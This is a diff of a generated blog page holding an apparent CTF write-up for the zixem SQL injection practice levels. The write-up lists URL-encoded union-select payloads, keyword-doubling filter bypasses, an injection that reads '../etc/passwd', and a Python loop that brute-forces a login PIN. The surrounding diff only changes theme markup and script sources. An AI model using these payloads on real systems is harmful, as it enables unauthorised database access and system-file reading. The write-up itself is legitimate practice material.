@@ -295,7 +295,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper post focus' style="display: none;">
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg"></div>
           
@@ -401,23 +401,34 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   <p>Site : <a target="_blank" rel="noopener" href="https://www.zixem.altervista.org/SQLi/">https://www.zixem.altervista.org/SQLi/</a></p>
 <hr>
-<h3 id="1-LEVEL-1"><a href="#1-LEVEL-1" class="headerlink" title="1. LEVEL-1"></a>1. LEVEL-1</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">201</span>,version(),<span class="hljs-number">3</span>;<span class="hljs-comment">--%20-</span><br></code></pre></td></tr></table></figure>
+<h3 id="1-LEVEL-1"><a href="#1-LEVEL-1" class="headerlink" title="1. LEVEL-1"></a>1. LEVEL-1</h3><pre><code class="sql">id=0%20union%20select%201,version(),3;--%20-</code></pre>
 <hr>
-<h3 id="2-LEVEL-2"><a href="#2-LEVEL-2" class="headerlink" title="2. LEVEL-2"></a>2. LEVEL-2</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">showprofile<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">201</span>,<span class="hljs-number">2</span>,version(),<span class="hljs-number">4</span>;<span class="hljs-comment">--%20-</span><br></code></pre></td></tr></table></figure>
+<h3 id="2-LEVEL-2"><a href="#2-LEVEL-2" class="headerlink" title="2. LEVEL-2"></a>2. LEVEL-2</h3><pre><code class="sql">showprofile=0%27%20union%20select%201,2,version(),4;--%20-</code></pre>
 <hr>
-<h3 id="3-LEVEL-3"><a href="#3-LEVEL-3" class="headerlink" title="3. LEVEL-3"></a>3. LEVEL-3</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">item<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>unionon<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">201</span>,<span class="hljs-number">2</span>,version(),<span class="hljs-number">4</span>;<span class="hljs-comment">--%20-</span><br></code></pre></td></tr></table></figure>
+<h3 id="3-LEVEL-3"><a href="#3-LEVEL-3" class="headerlink" title="3. LEVEL-3"></a>3. LEVEL-3</h3><pre><code class="sql">item=0%27%20unionon%20select%201,2,version(),4;--%20-</code></pre>
 <hr>
-<h3 id="4-LEVEL-4"><a href="#4-LEVEL-4" class="headerlink" title="4. LEVEL-4"></a>4. LEVEL-4</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">ebookid<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,version(),<span class="hljs-number">5</span>;<span class="hljs-comment">--%20-</span><br></code></pre></td></tr></table></figure>
+<h3 id="4-LEVEL-4"><a href="#4-LEVEL-4" class="headerlink" title="4. LEVEL-4"></a>4. LEVEL-4</h3><pre><code class="sql">ebookid=0%27%20union%20select%201,2,3,version(),5;--%20-</code></pre>
 <hr>
-<h3 id="5-LEVEL-5"><a href="#5-LEVEL-5" class="headerlink" title="5. LEVEL-5"></a>5. LEVEL-5</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python</span><br><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2000</span>):<br>param = <span class="hljs-string">&quot;http://www.zixem.altervista.org/SQLi/login_do.php?pass=&quot;</span>+<span class="hljs-built_in">str</span>(i)<br>r = requests.get(param)<br><span class="hljs-built_in">print</span> param<br><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Brute Force&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;found key: &quot;</span> + <span class="hljs-built_in">str</span>(i)<br>    <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+<h3 id="5-LEVEL-5"><a href="#5-LEVEL-5" class="headerlink" title="5. LEVEL-5"></a>5. LEVEL-5</h3><pre><code class="py">#!/usr/bin/python
+
+import requests
+
+for i in range(0,2000):
+param = &quot;http://www.zixem.altervista.org/SQLi/login_do.php?pass=&quot;+str(i)
+r = requests.get(param)
+print param
+
+if &quot;Brute Force&quot; in r.text:
+    print &quot;found key: &quot; + str(i)
+    break</code></pre>
 <hr>
-<h3 id="6-LEVEL-6"><a href="#6-LEVEL-6" class="headerlink" title="6. LEVEL-6"></a>6. LEVEL-6</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">serial<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">and</span><span class="hljs-operator">%</span><span class="hljs-number">201</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>id,teacher,teacher_age,price<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>teachers<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">where</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>id<span class="hljs-operator">=</span><span class="hljs-number">11</span><span class="hljs-operator">%</span><span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+<h3 id="6-LEVEL-6"><a href="#6-LEVEL-6" class="headerlink" title="6. LEVEL-6"></a>6. LEVEL-6</h3><pre><code class="sql">serial=0%20and%201=1%20union%20select%20id,teacher,teacher_age,price%20from%20teachers%20%20where%20id=11%23</code></pre>
 <hr>
-<h3 id="7-LEVEL-7"><a href="#7-LEVEL-7" class="headerlink" title="7. LEVEL-7"></a>7. LEVEL-7</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">201</span>,version(),<span class="hljs-number">3</span>;<span class="hljs-comment">--%20-</span><br></code></pre></td></tr></table></figure>
+<h3 id="7-LEVEL-7"><a href="#7-LEVEL-7" class="headerlink" title="7. LEVEL-7"></a>7. LEVEL-7</h3><pre><code class="sql">id=0%20union%20select%201,version(),3;--%20-</code></pre>
 <hr>
-<h3 id="8-LEVEL-8"><a href="#8-LEVEL-8" class="headerlink" title="8. LEVEL-8"></a>8. LEVEL-8</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span><span class="hljs-number">09</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">09</span>seselectlect<span class="hljs-operator">%</span><span class="hljs-number">091</span>,version(),<span class="hljs-number">3</span>;<span class="hljs-comment">--%09-</span><br></code></pre></td></tr></table></figure>
+<h3 id="8-LEVEL-8"><a href="#8-LEVEL-8" class="headerlink" title="8. LEVEL-8"></a>8. LEVEL-8</h3><pre><code class="sql">id=0%09union%09seselectlect%091,version(),3;--%09-</code></pre>
 <hr>
-<h3 id="9-LEVEL-9"><a href="#9-LEVEL-9" class="headerlink" title="9. LEVEL-9"></a>9. LEVEL-9</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>&quot;../etc/passwd&quot;,<span class="hljs-number">2</span>;<span class="hljs-comment">--%20-</span><br></code></pre></td></tr></table></figure>
+<h3 id="9-LEVEL-9"><a href="#9-LEVEL-9" class="headerlink" title="9. LEVEL-9"></a>9. LEVEL-9</h3><pre><code class="sql">0%27%20union%20select%20&quot;../etc/passwd&quot;,2;--%20-</code></pre>
 <hr>
 <h3 id="10-LEVEL-10"><a href="#10-LEVEL-10" class="headerlink" title="10. LEVEL-10"></a>10. LEVEL-10</h3><ul>
 <li>php uuencode -&gt; base64 encode</li>
@@ -437,7 +448,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
     </section>
     <section class='body'>
-      <div class="vlts-rps"><a class="item" href="/2020/04/10/angstormctf-200410/" title="angstorm ctf 2020 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">angstorm ctf 2020 Write up</span></a><a class="item" href="/2020/12/26/christmasctf-201226/" title="ChristmasCTF 2019 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">ChristmasCTF 2019 Write up</span></a><a class="item" href="/2020/05/14/websecbaby-200514/" title="websec.fr babysteps Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">websec.fr babysteps Write up</span></a></div></section></div>
+      <div class="vlts-rps"><a class="item" href="/2020/04/10/angstormctf-200410/" title="angstorm ctf 2020 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">angstorm ctf 2020 Write up</span></a><a class="item" href="/2020/12/26/christmasctf-201226/" title="ChristmasCTF 2019 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">ChristmasCTF 2019 Write up</span></a><a class="item" href="/2020/05/14/websecbaby-200514/" title="websec.fr babysteps Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">websec.fr babysteps Write up</span></a></div></section></div>
       
       
       
@@ -482,13 +493,16 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class='prev' href='/2020/04/10/zer0ptsctf-200410/'>
           <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>zer0pts 2020 Write up</p>
-          <p class='content'>1. [web] can you guess it?(338 pt)12345678910111213141516171819202122&lt;?phpinclude &#x27;config...</p>
+          <p class='content'>1. [web] can you guess it?(338 pt)&lt;?php
+include &#39;config.php&#39;; // FLAG is defined in co...</p>
         </a>
       
       
         <a class='next' href='/2020/02/23/trustctf-200223/'>
           <p class='title'>TRUST CTF 2019 Write up<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>1. (web) ezrc123456789101112131415161718192021222324252627282930313233343536373839404142434445464...</p>
+          <p class='content'>1. (web) ezrc&lt;?php session_start(); include &#39;config.php&#39;; ?&gt;
+&lt;?php
+    if(!isset...</p>
         </a>
       
     </div>
@@ -703,7 +717,7 @@ var loadCSS = function( href, before, media, attributes ){
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
   
-  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@10.5.0/styles/atelier-cave-dark.css", window.volantis.loadcss);
+  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -782,7 +796,7 @@ var loadCSS = function( href, before, media, attributes ){
   function loadIssuesJS() {
     if ($(".md").find(".issues-api").length == 0) return;
 	
-	  loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/issues.min.js');
+	  loadScript('/js/issues.js');
 	
   };
   $(function () {
@@ -900,29 +914,6 @@ var loadCSS = function( href, before, media, attributes ){
 
 
 
-   <script type="text/javascript">
-  loadScript("https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js")
-  function pjax_scrollrebeal() {
-    ScrollReveal().reveal('.l_main .reveal', {
-      distance: '32px',
-      duration: '800',
-      interval: '20',
-      scale: '1',
-      easing: 'ease-out'
-    });
-  }
-  $(function () {
-  var checkScrollReveal = setInterval(function () {
-    if ($("#safearea").css("display")!="block") return
-    if (typeof ScrollReveal=="undefined") return
-    clearInterval(checkScrollReveal)
-	pjax_scrollrebeal();
-  }, 100)
-  });
-  volantis.pjax.push(pjax_scrollrebeal)
-</script>
-
-
 
 
 
@@ -1024,7 +1015,7 @@ var loadCSS = function( href, before, media, attributes ){
 
 
   
-<script src="https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/app.min.js"></script>
+<script src="/js/app.js"></script>
 
 
 
@@ -1036,7 +1027,7 @@ const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
 
 $('.input.u-search-input').one('focus',function(){
 	
-		loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/search/hexo.min.js',setSearchService);
+		loadScript('/js/search/hexo.js',setSearchService);
 	
 })
 
